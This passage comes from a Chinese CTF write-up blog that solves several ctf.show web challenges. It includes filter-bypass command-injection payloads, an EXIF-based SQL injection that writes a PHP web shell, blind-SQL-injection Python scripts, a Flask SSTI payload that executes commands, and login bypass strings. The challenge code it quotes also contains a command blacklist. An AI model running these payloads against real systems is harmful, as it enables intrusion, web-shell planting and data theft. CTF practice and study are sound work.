class="keyword">if</span> ($md5==md5(md5($md5)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;more&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;tail&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;less&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;head&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;tac&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;sort&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;nl&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/[&#x27;\*\&quot;[?]/&quot;</span>, $get_flag)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;非预期修复*2&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">去非洲吧</span><br></pre></td></tr></table></figure><p>可以看到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> var_dump(<span class="number">99999999999999999.99999999999999999</span>==<span class="number">99999999999999999</span>);</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;0.</span><br><span class="line">?num&#x3D;99999999999999999.999999999999999990</span><br></pre></td></tr></table></figure><p>接着一样，payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;99999999999999999.999999999999999990&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t%09&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;99999999999999999.999999999999999990&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t%09&#96;ls&#96;</span><br></pre></td></tr></table></figure><h3 id="WEB你没见过的注入36D杯"><a href="#WEB你没见过的注入36D杯" class="headerlink" title="WEB你没见过的注入36D杯"></a>WEB你没见过的注入36D杯</h3><p>提示访问<code>robots.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;pwdreset.php</span><br></pre></td></tr></table></figure><p>成功重置<code>admin</code>的密码，登陆之后发现是个上传，接着发现上传所有文件都变成<code>.zip</code>了，并且有文件属性相关信息</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200918194127.png"></p><p>发现和<code>file</code>命令输出一样</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200918194424.png"></p><p>接着就是<code>EXIF</code>头注入了，可以使用<code>exiftool</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -overwrite_original -comment=<span class="string">&quot;test&quot;</span> 1.jpg</span><br></pre></td></tr></table></figure><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200918201317.png"></p><p>再上传发现</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200918201627.png"></p><p>试想有可能存到数据库里，猜后台sql:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">column</span>(<span class="keyword">name</span>, <span class="keyword">type</span>, lineFeed) <span class="keyword">values</span> ($filename, $filetype, $filelinefeed);</span><br></pre></td></tr></table></figure><p>尝试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -overwrite_original -comment=<span class="string">&quot;test\&quot;&#x27;);select sleep(10);&quot;</span> 1.jpg</span><br></pre></td></tr></table></figure><p>发现成功延时了，直接写一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -overwrite_original -comment&#x3D;&quot;test\&quot;&#39;);select 0x3c3f706870206576616c28245f504f53545b315d293b into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;&quot; 1.jpg</span><br></pre></td></tr></table></figure><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200918211349.png"></p><p>发现部分内容没写上 估计有长度限制，用短标签缩短长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -overwrite_original -comment=<span class="string">&quot;test\&quot;&#x27;);select 0x3c3f3d60245f504f53545b315d603b into outfile &#x27;/var/www/html/1.php&#x27;;&quot;</span> 1.jpg</span><br></pre></td></tr></table></figure><p>hex部分是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`$_POST[<span class="number">1</span>]`;</span><br></pre></td></tr></table></figure><h3 id="web1签到内部赛"><a href="#web1签到内部赛" class="headerlink" title="web1签到内部赛"></a>web1签到内部赛</h3><p>查看源码发现<code>register.php</code>，存在sql注入，ban了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and | sleep 空格 &amp; if ascii</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://8d1e1a44-371c-4be6-ae98-326ebebbff39.chall.ctf.show/register.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        p1=<span class="string">&quot;1@1.com&#x27;/**/or/**/(case/**/when/**/ord(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;/**/then/**/benchmark(5000000,md5(0x41))/**/else/**/1/**/end)/**/or/**/&#x27;&quot;</span>.format(i,mid)</span><br><span class="line">        p2=<span class="string">&quot;1@1.com&#x27;/**/or/**/(case/**/when/**/ord(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;&#125;,1))=&#123;&#125;/**/then/**/benchmark(5000000,md5(0x41))/**/else/**/1/**/end)/**/or/**/&#x27;&quot;</span>.format(i,mid)</span><br><span class="line">        data1=&#123;<span class="string">&#x27;e&#x27;</span>:p1,<span class="string">&#x27;u&#x27;</span>:<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;p&#x27;</span>:<span class="string">&#x27;1234&#x27;</span>&#125;</span><br><span class="line">        data2=&#123;<span class="string">&#x27;e&#x27;</span>:p2,<span class="string">&#x27;u&#x27;</span>:<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;p&#x27;</span>:<span class="string">&#x27;1234&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,mid)</span><br><span class="line">            r1=requests.post(url,data=data2,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag+=chr(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r2=requests.post(url,data=data1,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># web</span></span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure><p>可以注出数据库，但是好像不能查information_schema</p><h3 id="web03出题人不想跟你说话-jpg内部赛"><a href="#web03出题人不想跟你说话-jpg内部赛" class="headerlink" title="web03出题人不想跟你说话.jpg内部赛"></a>web03出题人不想跟你说话.jpg内部赛</h3><p>看到刀上有cai字样，盲猜是一句话密码，蚁剑连上，有两个hint:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hint1: whoami &amp;&amp; ls -l &#x2F;</span><br><span class="line"></span><br><span class="line">hint2:如你们所说，提权，看看服务器有什么服务</span><br></pre></td></tr></table></figure><p><code>ps -aux</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root         1  0.0  0.0  17960   636 ?        Ss   12:27   0:00 /bin/sh /usr/<span class="built_in">local</span>/bin/docker-php-entrypoint</span><br><span class="line">root        11  0.0  0.0  23656   592 ?        Ss   12:27   0:00 /usr/sbin/cron</span><br><span class="line">root        12  0.0  0.0   4384     4 ?        S    12:27   0:00 tail -F /dev/null</span><br><span class="line">root        13  0.0  0.0 133628  2036 ?        Ss   12:27   0:00 php-fpm: master process (/etc/php5/fpm/php-fpm.conf)</span><br><span class="line">www-data    14  0.0  0.0 134104  6360 ?        S    12:27   0:00 php-fpm: pool www</span><br><span class="line">www-data    15  0.0  0.0 134120  5132 ?        S    12:27   0:00 php-fpm: pool www</span><br><span class="line">root        16  0.0  0.0  85888  1084 ?        Ss   12:27   0:00 nginx: master process nginx</span><br><span class="line">www-data    17  0.0  0.0  86524  1852 ?        S    12:27   0:00 nginx: worker process</span><br><span class="line">www-data    18  0.0  0.0  86184  1364 ?        S    12:27   0:00 nginx: worker process</span><br><span class="line">www-data    19  0.0  0.0  86528  2140 ?        S    12:27   0:00 nginx: worker process</span><br><span class="line">www-data    20  0.0  0.0  86184  1328 ?        S    12:27   0:00 nginx: worker process</span><br><span class="line">www-data   143  0.0  0.0 133628  7436 ?        S    12:40   0:00 php-fpm: pool www</span><br><span class="line">www-data   159  0.0  0.0  17952  2856 ?        S    12:42   0:00 sh -c /bin/sh -c <span class="string">&quot;cd &quot;</span>/<span class="string">&quot;;ps -aux;echo [S];pwd;echo [E]&quot;</span> 2&gt;&amp;1</span><br><span class="line">www-data   160  0.0  0.0  17956  2848 ?        S    12:42   0:00 /bin/sh -c <span class="built_in">cd</span> /;ps -aux;<span class="built_in">echo</span> [S];<span class="built_in">pwd</span>;<span class="built_in">echo</span> [E]</span><br><span class="line">www-data   161  0.0  0.0  15568  2116 ?        R    12:42   0:00 ps -aux</span><br></pre></td></tr></table></figure><p>发现有个敏感文件<code>/usr/local/bin/docker-php-entrypoint</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;FLAG&#125;</span> &gt; /flag</span><br><span class="line"></span><br><span class="line">chown -R root:root /flag</span><br><span class="line">chmod 700 /flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> FLAG</span><br><span class="line"></span><br><span class="line">php5-fpm &amp;</span><br><span class="line"></span><br><span class="line">nginx &amp;</span><br><span class="line"></span><br><span class="line">/usr/sbin/cron</span><br><span class="line"></span><br><span class="line">tail -F /dev/null</span><br></pre></td></tr></table></figure><p>并且nginx的某个进程是以root运行的，搜了下发现<code>CVE-2016-1247</code></p><p>bash反弹shell，将poc传到<code>/tmp</code>目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.seebug.org&#x2F;vuldb&#x2F;ssvid-92538</span><br></pre></td></tr></table></figure><p>如果以下报错</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200917213053.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&quot;s/\r//&quot;</span> poc</span><br></pre></td></tr></table></figure><p>等会就好了</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200917213959.png"></p><h3 id="web2蓝瘦内部赛"><a href="#web2蓝瘦内部赛" class="headerlink" title="web2蓝瘦内部赛"></a>web2蓝瘦内部赛</h3><p>查看源码有两个hint:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- param: ctfshow --&gt;</span><br><span class="line">&lt;!-- key: ican --&gt;</span><br></pre></td></tr></table></figure><p>猜测分别是参数，flask key的意思</p><p>伪造session</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200929141453.png"></p><p>接着就可以传参数ssti,p神的payload直接可以打，flag在环境变量里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;env&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="web4一览无余-内部赛"><a href="#web4一览无余-内部赛" class="headerlink" title="web4一览无余_内部赛"></a>web4一览无余_内部赛</h3><p>直接给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这啥也没有啊，看了看网站容器是nginx，猜测是：<a href="https://moonback1314.gitee.io/2020/05/05/Vulhub%E4%B9%8Bphp/#CVE-2019-11043">https://moonback1314.gitee.io/2020/05/05/Vulhub%E4%B9%8Bphp/#CVE-2019-11043</a></p><p>试了试，果然是，不过执行命令时有时候会不成功，flag在网站目录</p><h3 id="web5登陆就有flag-内部赛"><a href="#web5登陆就有flag-内部赛" class="headerlink" title="web5登陆就有flag_内部赛"></a>web5登陆就有flag_内部赛</h3><p>貌似万能密码题，随便加个东西发现提示太长了，应该是长度限制，直接下面都行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">u&#x3D;&#39;^&#39;&#39;#&amp;p&#x3D;1</span><br><span class="line">u&#x3D;&#39;^0#&amp;p&#x3D;1</span><br><span class="line">u&#x3D;&#39;%260#&amp;p&#x3D;1</span><br><span class="line">u&#x3D;&#39;%261#&amp;p&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="web6签退内部赛"><a href="#web6签退内部赛" class="headerlink" title="web6签退内部赛"></a>web6签退内部赛</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ($S = $_GET[<span class="string">&#x27;S&#x27;</span>])?<span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$S</span>&quot;</span>):highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?S&#x3D;&#123;system(&#39;cat ..&#x2F;..&#x2F;flag.txt&#39;)&#125;;</span><br></pre></td></tr></table></figure><h3 id="web2-观星"><a href="#web2-观星" class="headerlink" title="web2_观星"></a>web2_观星</h3><p>过滤了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">, ascii 空格 &#x3D; like and</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(case<span class="comment">/**/</span>when<span class="comment">/**/</span>ord(substr((<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="comment">/**/</span><span class="keyword">in</span><span class="comment">/**/</span>(<span class="number">0x77656231</span>)<span class="comment">/**/</span>%<span class="number">26</span>%<span class="number">26</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span><span class="keyword">in</span><span class="comment">/**/</span>(<span class="number">0x666c6167</span>))<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>))&lt;<span class="number">100</span><span class="comment">/**/</span><span class="keyword">then</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">else</span><span class="comment">/**/</span><span class="number">0</span><span class="comment">/**/</span><span class="keyword">end</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>有几个点需要注意：</p><ul><li><code>and</code>过滤用<code>&amp;&amp;</code>需要url编码</li><li>等于号过滤用<code>in</code>,要加括号，还可以用同时不满足大于小于两个条件</li><li>单引号过滤用十六进制</li><li><code>,</code>过滤用<code>from...for</code></li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://196a9ac5-2082-4530-8ae1-6a72f276e86b.chall.ctf.show/index.php?id=&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    f=<span class="number">1</span></span><br><span class="line">    midflag=<span class="number">1</span></span><br><span class="line">    mid=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> f <span class="keyword">and</span> midflag!=mid:</span><br><span class="line">        f=<span class="number">0</span></span><br><span class="line">        midflag=mid</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        p1=<span class="string">&quot;(case/**/when/**/ord(substr((select/**/flag/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))&lt;&#123;&#125;/**/then/**/1/**/else/**/0/**/end)#&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        p2=<span class="string">&quot;(case/**/when/**/ord(substr((select/**/flag/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;/**/then/**/1/**/else/**/0/**/end)#&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,mid)</span><br><span class="line">            r1=requests.get(url+p1)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;pitch-and-toss,&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">                f=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            r2=requests.get(url+p2)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;pitch-and-toss,&#x27;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">                f=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> f==<span class="number">0</span>:</span><br><span class="line">            flag+=chr(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="easyshell-36D练手赛"><a href="#easyshell-36D练手赛" class="headerlink" title="easyshell_36D练手赛"></a>easyshell_36D练手赛</h3><p>明显hash长度扩展攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://7270896d-ae34-4a8f-893e-287f6e5a21cc.chall.ctf.show/?&#x27;</span></span><br><span class="line">hsh=<span class="string">&#x27;fc77c20ed2841d8162335eaebb2f3c09&#x27;</span></span><br><span class="line">s1=<span class="string">&#x27;&#x27;&#x27;1&#x27;&#x27;&#x27;</span></span><br><span class="line">s2=<span class="string">&#x27;&#x27;&#x27;admin&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span 